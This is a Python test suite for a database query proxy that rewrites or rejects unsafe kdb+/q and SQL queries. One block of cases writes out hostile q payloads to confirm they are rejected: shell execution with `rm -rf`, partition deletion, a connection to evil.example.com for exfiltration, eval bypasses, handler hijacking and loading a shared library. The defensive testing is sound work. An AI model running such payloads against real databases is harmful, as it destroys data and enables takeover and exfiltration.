"""Prove the query proxy: unsafe queries are rewritten to safe ones or
rejected; the database only ever sees bounded, allowlisted, read-only queries.

Run:  python -m aegis.query_proxy_test
"""

from __future__ import annotations

import sys
from pathlib import Path

from .query_proxy import QueryGuard

# (name, query, expected_action, must_appear_in_safe_query_or_None)
CASES = [
    ("q: unbounded scan of partitioned table",
     "select from trade", "rewrite", "where date=.z.d"),
    ("q: unbounded scan gets a partition-safe row cap too",
     "select from trade", "rewrite", "i<1000000"),
    ("q: has date, still gets a row cap",
     "select sym,price from quote where date=2024.01.01", "rewrite", "i<1000000"),
    ("q: already bounded (select[N]) -> allow",
     "select[100] from quote where date=.z.d", "allow", None),
    ("q: oversized caller i<N is tightened to max_rows (not trusted)",
     "select from trade where date=.z.d, i<999999999", "rewrite", "i<1000000"),
    ("q: oversized caller select[N] is tightened to max_rows",
     "select[9999999] from ref", "rewrite", "select[1000000]"),
    ("q: within-limit i<N is left alone -> allow",
     "select from quote where date=.z.d, i<500", "allow", None),
    ("q: list literal with internal ; is NOT multi-statement",
     "select[100] from quote where date=.z.d, sym in (`AAPL;`MSFT)", "allow", None),
    ("q: non-partitioned ref table, capped",
     "select from ref", "rewrite", "i<1000000"),
    ("q: commented-out where must NOT fool the bounded check",
     "select from trade / where date=.z.d", "rewrite", "where date=.z.d"),
    ("q: table not on allowlist -> reject",
     "select from secret_book", "reject", None),
    ("q: mutation -> reject",
     "delete from trade", "reject", None),
    ("q: functional form -> reject (fail closed)",
     "?[trade;();0b;()]", "reject", None),
    ("q: multiple statements -> reject",
     "select from quote where date=.z.d; select from trade", "reject", None),
    ("sql: unbounded partitioned -> reject (no date predicate)",
     "SELECT * FROM trades", "reject", None),
    ("sql: ref table, LIMIT injected",
     "SELECT * FROM ref", "rewrite", "LIMIT 1000000"),
    ("sql: bounded -> allow",
     "SELECT * FROM ref LIMIT 50", "allow", None),

    # --- dangerous q builtins embedded in an otherwise-valid select MUST reject.
    # The DB only ever receives a read; a select whose body calls OS/file/eval/
    # handler builtins is not a read. (Found by the FSP pilot: `select system
    # "rm -rf /data" from trade` was structurally accepted and ran shell.)
    ("q: embedded system shell -> reject",
     'select system "rm -rf /data/hdb" from trade where date=.z.d', "reject", None),
    ("q: embedded hdel (delete partition dir) -> reject",
     "select from trade where date=.z.d, x:hdel `:/data/hdb/2015.01.08", "reject", None),
    ("q: embedded hopen (exfil/lateral) -> reject",
     "select from trade where date=.z.d, h:hopen `:evil.example.com:9999", "reject", None),
    ("q: value/eval dynamic-eval bypass -> reject",
     'select value "system \\"id\\"" from trade where date=.z.d', "reject", None),
    ("q: exec system kill -> reject",
     'exec system "kill -9 12345" from trade where date=.z.d', "reject", None),
    ("q: set overwrite (e.g. sym file) -> reject",
     "select set `:/data/hdb/sym from trade where date=.z.d", "reject", None),
    ("q: .z.pg handler hijack -> reject",
     "select from trade where date=.z.d, .z.pg:{system x}", "reject", None),
    ("q: save to disk -> reject",
     "select save `:/tmp/dump from trade where date=.z.d", "reject", None),
    ("q: persistent update on backtick table (embedded) -> reject",
     "select x from (update price:0 from `trade) where date=.z.d", "reject", None),
    ("q: 2: dynamic shared-object load -> reject",
     'select (`:libx 2: (`f;1)) from trade where date=.z.d', "reject", None),
    # benign date/time .z reads and functional update must STILL pass (no over-block)
    ("q: benign .z.d date read -> not rejected by handler rule",
     "select from quote where date=.z.d, i<100", "allow", None),
    ("q: functional update in analytics (no backtick) -> not over-blocked",
     "select avg mid from (update mid:(bid+ask)%2 from quote) where date=.z.d", "rewrite", "i<"),
]


def run() -> int:
    guard = QueryGuard.from_policy(Path(__file__).with_name("policy.json"))
    print("=== Aegis query proxy — ground-truth enforcement ===\n")
    failures = 0
    for name, query, expected, must_contain in CASES:
        v = guard.analyze(query)
        ok = v.action == expected
        if ok and must_contain is not None:
            ok = v.safe_query is not None and must_contain in v.safe_query
        failures += 0 if ok else 1
        mark = "ok " if ok else "XX "
        print(f"  {mark} {expected:<7} {name}")
        if v.action == "rewrite":
            print(f"          in : {query}")
            print(f"          out: {v.safe_query}")
            print(f"          why: {'; '.join(v.reasons)}")
        elif v.action == "reject":
            print(f"          rejected: {'; '.join(v.reasons)}")

    # enforce() raises on reject — prove the DB never receives a rejected query.
    from .query_proxy import QueryRejected
    raised = False
    try:
        guard.enforce("select from secret_book")
    except QueryRejected:
        raised = True
    failures += 0 if raised else 1
    print(f"\n  {'ok ' if raised else 'XX '} enforce() raises QueryRejected on a disallowed query")

    print(f"\n{'PASS' if failures == 0 else 'FAIL'} — {failures} failure(s)")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(run())
